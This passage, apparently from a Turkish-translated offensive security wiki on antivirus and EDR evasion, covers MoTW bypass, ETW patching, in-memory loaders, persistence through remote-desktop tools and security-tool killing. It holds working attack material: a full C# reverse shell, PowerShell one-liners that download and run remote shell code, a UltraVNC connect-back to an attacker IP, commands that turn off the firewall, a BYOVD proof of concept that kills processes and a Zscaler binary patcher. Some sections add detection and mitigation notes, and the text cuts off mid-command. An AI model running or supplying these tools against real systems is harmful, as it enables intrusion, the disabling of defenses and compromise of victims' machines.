<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS'in kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> Bir yürütülebilir dosyanın **güvenilir** bir imzalama sertifikasıyla imzalanmış olması durumunda SmartScreen'i **tetiklemediğini** not etmek önemlidir.

payloads'larınızın Mark of The Web almasını engellemenin çok etkili bir yolu, onları ISO gibi bir konteyner içine paketlemektir. Bunun sebebi, Mark-of-the-Web (MOTW)'ün **non NTFS** hacimlerine uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin olayları kaydetmesine izin veren güçlü bir logging mekanizmasıdır. Ancak, güvenlik ürünleri tarafından kötü amaçlı aktiviteleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin nasıl devre dışı bırakıldığına (bypass edildiğine) benzer şekilde, kullanıcı alanı prosesinin **`EtwEventWrite`** fonksiyonunun hiçbir olay kaydetmeden hemen dönmesini sağlamak da mümkündür. Bu, fonksiyonun bellekte patch'lenerek hemen dönmesi sağlanarak yapılır; böylece o proses için ETW logging etkisizleştirilmiş olur.

Daha fazla bilgi için bakınız: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarını belleğe yüklemek uzun zamandır biliniyor ve post-exploitation araçlarınızı AV tarafından yakalanmadan çalıştırmanın hâlâ çok iyi bir yoludur.

Payload doğrudan belleğe yükleneceği için diske dokunmayacak; bu yüzden tüm proses için AMSI'yi patch'lemek dışında ekstra bir şeyle uğraşmamız gerekmeyecek.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# assembly'lerini doğrudan bellekte çalıştırabilme yeteneği sunar, fakat bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem yeni bir kurban proses (sacrificial process) spawn etmeyi, post-exploitation zararlı kodunuzu bu yeni prosese inject etmeyi, zararlı kodu çalıştırmayı ve işlem bitince yeni prosesi sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run metodunun avantajı çalışmanın Beacon implant prosesimizin dışında gerçekleşmesidir. Bu, post-exploitation eylemimiz ters gider veya yakalanırsa implantımızın hayatta kalma ihtimalinin çok daha yüksek olduğu anlamına gelir. Dezavantajı ise Behavioural Detections tarafından yakalanma şansınızın daha yüksek olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Kendi prosesinin içine post-exploitation zararlı kodu inject etmeyi kapsar. Bu şekilde yeni bir proses oluşturmak ve bunun AV tarafından taranmasına maruz kalmaktan kaçınabilirsiniz, fakat dezavantajı payload'unuzun çalışması sırasında bir şeyler ters giderse beacon'ınızı kaybetme ihtimalinizin çok daha yüksek olmasıdır çünkü proses çökmeye neden olabilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eğer C# Assembly loading hakkında daha fazla okumak isterseniz, şu makaleye bakın: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'larına göz atın ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ayrıca C# Assembly'lerini **PowerShell** üzerinden de yükleyebilirsiniz, bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosu](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), compromised makinede yüklü olan interpreter ortamına Attacker Controlled SMB share üzerinden erişim vererek diğer diller kullanılarak zararlı kod çalıştırmak mümkündür.

SMB share üzerindeki Interpreter Binaries'e ve ortama erişim vererek, ele geçirilmiş makinenin belleği içinde bu dillerde arbitrary code execute edebilirsiniz.

Repo şu notu veriyor: Defender hâlâ script'leri tarıyor ancak Go, Java, PHP vb. kullanarak static signature'ları bypass etmede daha fazla esneklik elde ediyoruz. Bu dillerde rastgele obfuscation yapılmamış reverse shell script'leri ile yapılan testler başarılı oldu.

## TokenStomping

Token stomping, saldırganın bir access token'ı veya bir güvenlik ürünü (EDR veya AV gibi) ile etkileşime girerek privileges'ını düşürmesine olanak tanıyan bir tekniktir; böylece proses ölmez ama kötü amaçlı aktiviteleri kontrol etme yetkisi kalmaz.

Windows bunu önlemek için güvenlik proseslerinin token'ları üzerinde dış proseslerin handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Bu blog yazısında açıklandığı gibi ([**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)), kurbanın PC'sine Chrome Remote Desktop kurup bunu ele geçirip persistence sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve sonra Windows için MSI dosyasına tıklayarak MSI dosyasını indirin.
2. Kurulumu hedefte sessizce çalıştırın (admin gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Sihirbaz sizden yetki isteyecek; devam etmek için Authorize düğmesine tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Not: pin parametresi GUI kullanmadan pin ayarlamaya izin verir).

## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını göz önünde bulundurmanız gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Her ortama karşı giderken kendi güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu ayrıca [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında başka harika bir konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanarak binary'nin parçalarını teker teker kaldırıp Defender'ın hangi kısmı zararlı bulduğunu tespit ettirebilirsiniz ve bunu size ayırır.\
Aynı işi yapan başka bir araç da [**avred**](https://github.com/dobin/avred) olup açık web üzerinden hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunmaktadır.

### **Telnet Server**

Windows10'a kadar, tüm Windows sürümleri bir **Telnet server** ile geliyordu ve bunu (administrator olarak) şu şekilde kurabiliyordunuz:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlamasını sağla** ve şimdi **çalıştır**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

İndirme: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin indirmelerini, setup'ı değil tercih edin)

**ON THE HOST**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola girin
- _View-Only Password_ alanına bir parola girin

Ardından, ikili dosya _**winvnc.exe**_ ve **yeni** oluşturulan dosya _**UltraVNC.ini**_'yi **victim**'ın içine taşıyın

#### **Reverse connection**

**attacker**, bir reverse **VNC connection** yakalamaya **hazır** olmak için kendi **host**'unda `vncviewer.exe -listen 5900` ikili dosyasını **çalıştırmalıdır**. Ardından, **victim** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` çalıştırın

**UYARI:** Gizliliği korumak için aşağıdaki işlemleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- `UltraVNC.ini` aynı dizinde olmadan `winvnc`'i başlatmayın yoksa [the config window](https://i.imgur.com/rfMQWcf.png) açılır
- `winvnc -h` ile yardım çalıştırmayın, aksi halde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

İndirme: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı başlatın** `msfconsole -r file.rc` ile ve **xml payload**'ı şununla **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Bunu şu komutla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Bununla birlikte kullan:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using derleyici
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# için obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python kullanarak injector oluşturma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603, ransomware bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programını kullandı. Araç, **kendi savunmasız ama *imzalı* sürücüsünü** getiriyor ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bunu kötüye kullanıyor.

Önemli çıkarımlar
1. **Signed driver**: Diskte teslim edilen dosya `ServiceMouse.sys` olsa da ikili, Antiy Labs’ın “System In-Depth Analysis Toolkit”inden meşru şekilde imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücünün geçerli bir Microsoft imzası olduğundan Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder ve ikinci satır onu başlatarak `\\.\ServiceMouse`'ın user land'den erişilebilir hale gelmesini sağlar.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir prosesi sonlandırma (Defender/EDR servislerini öldürmek için kullanılır) |
| `0x990000D0` | Diskteki rastgele bir dosyayı silme |
| `0x990001D0` | Sürücüyü boşaltma ve servisi kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD kullanıcı modu korumalarını tamamen atlar; kernelde çalışan kod, korumalı prosesleri açabilir, sonlandırabilir veya PPL/PP, ELAM veya diğer sertleştirme özellikleri ne olursa olsun kernel objeleriyle oynayabilir.

Tespit / Hafifletme
•  Microsoft’un vulnerable-driver block list (`HVCI`, `Smart App Control`) etkinleştirilerek Windows'un `AToolsKrnl64.sys` yüklemesini reddetmesi sağlanmalı.  
•  Yeni *kernel* servislerinin oluşturulması izlenmeli ve bir sürücü world-writable bir dizinden yüklendiğinde veya allow-list'te olmadığında alarm üretilmeli.  
•  Özel device objelerine kullanıcı modu handle'larının oluşturulması ve bunu takiben şüpheli `DeviceIoControl` çağrıları izlenmeli.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’ın **Client Connector**'ı device-posture kurallarını yerelde uygular ve sonuçları diğer bileşenlerle iletmek için Windows RPC'ye dayanır. Tam bir atlatmayı mümkün kılan iki zayıf tasarım tercihi vardır:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (sunucuya boolean gönderilir).  
2. İç RPC endpointleri yalnızca bağlanan executable'ın **Zscaler tarafından imzalanmış** olduğunu doğrular (via `WinVerifyTrust`).

Diskteki dört imzalı ikiliyi yama yaparak her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür, böylece tüm kontroller uyumlu olur |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ herhangi bir (hatta unsigned) process RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirildi |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kısa devre yapıldı |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyalar değiştirildikten ve servis yığını yeniden başlatıldıktan sonra:

* **Tüm** posture kontrolleri **yeşil/uyumlu** olarak görüntülenir.
* İmzalanmamış veya değiştirilmiş ikili dosyalar, named-pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş host, Zscaler politikalarıyla tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafı güven kararlarının ve basit imza kontrollerinin birkaç bayt yamasıyla nasıl alt edilebileceğini gösterir.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL), yalnızca aynı veya daha yüksek seviyedeki protected process'lerin birbirlerini değiştirebilmesini sağlayan bir signer/seviye hiyerarşisi uygular. Saldırgan perspektifinden, eğer meşru olarak PPL-etkin bir binary başlatıp argümanlarını kontrol edebiliyorsanız, benign işlevselliği (ör. logging) AV/EDR tarafından kullanılan korumalı dizinlere karşı sınırlı, PPL destekli bir write primitive'ine dönüştürebilirsiniz.

What makes a process run as PPL
- Hedef EXE (ve yüklü herhangi bir DLL) PPL-uyumlu bir EKU ile imzalanmış olmalıdır.
- Process, CreateProcess ile şu flag'ler kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Uyumluluk gösteren bir protection level, binary'nin signer'ı ile eşleşecek şekilde talep edilmelidir (ör. anti-malware signer'lar için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'lar için `PROTECTION_LEVEL_WINDOWS`). Yanlış level'lar oluşturma sırasında başarısız olur.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Açık kaynak yardımcı: CreateProcessAsPPL (protection level'ı seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım deseni:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikili `C:\Windows\System32\ClipUp.exe` kendi kendine çalıştırılır ve çağıranın belirttiği bir yola günlük dosyası yazmak için bir parametre kabul eder.
- PPL süreci olarak başlatıldığında, dosya yazma işlemi PPL korumasıyla gerçekleşir.
- ClipUp boşluk içeren yolları çözümlleyemez; normalde korunan konumlara işaret etmek için 8.3 kısa yolları kullanın.

8.3 short path helpers
- Kısa adları listele: `dir /x` her üst dizinde.
- cmd'de kısa yolu türet: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) ile bir başlatıcı (ör., CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) ClipUp'a günlük-yolu argümanını geçirerek korumalı bir AV dizininde (ör., Defender Platform) dosya oluşturmayı zorlayın. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili normalde AV tarafından çalışırken açık/kilitlenmişse (ör., MsMpEng.exe), yazmayı AV başlamadan önce önyüklemede planlamak için daha erken güvenilir şekilde çalışan bir otomatik başlatma servisi kurun. Önyükleme sırasını Process Monitor ile doğrulayın (boot logging).
4) Yeniden başlatmada PPL destekli yazma AV ikili dosyalarını kilitlemeden önce gerçekleşir; bu da hedef dosyayı bozar ve başlatılmasını engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp'ın yazdığı içeriğin yerleştirme dışında kontrolü sizde değildir; bu primitif hassas içerik enjeksiyonundan ziyade bozmaya uygundur.
- Bir hizmeti yüklemek/başlatmak ve bir yeniden başlatma penceresi için local admin/SYSTEM gerektirir.
- Zamanlama kritiktir: hedef açık olmamalıdır; önyükleme zamanı yürütme dosya kilitlerinden kaçınır.

Detections
- Özellikle önyükleme sırasında, standart dışı başlatıcılar tarafından başlatılmış olanlar da dahil olmak üzere, alışılmadık argümanlarla `ClipUp.exe` süreç oluşturulması.
- Otomatik başlatma için yapılandırılmış ve Defender/AV'den önce sürekli başlayan şüpheli ikili dosyaları işaret eden yeni servisler. Defender başlatma hatalarından önceki servis oluşturma/değişikliklerini inceleyin.
- Defender ikili dosyaları/Platform dizinleri üzerinde dosya bütünlüğü izleme; protected-process bayraklarına sahip süreçler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV olmayan ikili dosyalar tarafından anormal PPL düzeyi kullanımını arayın.

Mitigations
- WDAC/Code Integrity: hangi imzalı ikili dosyaların PPL olarak ve hangi ebeveyn süreçler altında çalışabileceğini kısıtlayın; meşru bağlamların dışındaki ClipUp çağrılarını engelleyin.
- Servis hijyeni: otomatik başlatma servislerinin oluşturulması/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğundan emin olun; ikili dosya bozulmasını gösteren başlangıç hatalarını araştırın.
- Ortamınızla uyumluysa, güvenlik araçlarını barındıran hacimlerde 8.3 kısa-isim üretimini devre dışı bırakmayı düşünün (iyice test edin).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender, çalışacağı platformu şu alt klasörleri sıralayarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek leksikografik sürüm dizesine sahip alt klasörü seçer (ör. `4.18.25070.5-0`), ardından Defender servis süreçlerini oradan başlatır (ilgili servis/registry yollarını güncelleyerek). Bu seçim dizin girişlerine, dizin reparse point'lerine (symlinks) kadar güvenir. Bir yönetici bunu Defender'ı saldırganın yazabileceği bir yola yönlendirmek ve DLL sideloading veya servis aksatması elde etmek için kullanabilir.

Preconditions
- Local Administrator (Platform klasörü altında dizin/symlink oluşturmak için gerekli)
- Yeniden başlatma yapabilme veya Defender platform yeniden-seçimini tetikleyebilme (önyüklemede servis yeniden başlatma)
- Sadece yerleşik araçlar gereklidir (mklink)

Why it works
- Defender kendi klasörlerine yazılmasını engeller, ancak platform seçimi dizin girişlerine güvenir ve hedefin korunmuş/güvenilir bir yola çözümlendiğini doğrulamadan leksikografik olarak en yüksek sürümü seçer.

Step-by-step (example)
1) Mevcut platform klasörünün yazılabilir bir klonunu hazırlayın, örn. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
